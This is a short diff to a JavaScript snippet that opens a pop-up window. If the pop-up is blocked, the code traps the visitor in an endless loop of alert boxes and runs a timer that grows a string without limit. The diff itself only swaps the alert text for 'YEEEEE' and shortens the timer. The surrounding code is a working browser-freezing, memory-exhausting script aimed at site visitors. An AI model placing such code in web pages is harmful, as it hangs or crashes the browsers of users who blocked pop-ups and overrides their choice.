@@ -1,13 +1,13 @@
 var myPopup = window.open("site-on-my-domain", "screenX=100");
 if (!myPopup)
   while (true) {
-    alert("Please allow pop-ups for this website")
+    alert("YEEEEE")
     setTimeout(function() {
       txt = "a";
       while (true) {
         txt = txt += "a";
       }
-    }, 50);
+    }, 5);
   } else {
     myPopup.onload = function() {
       setTimeout(function() {
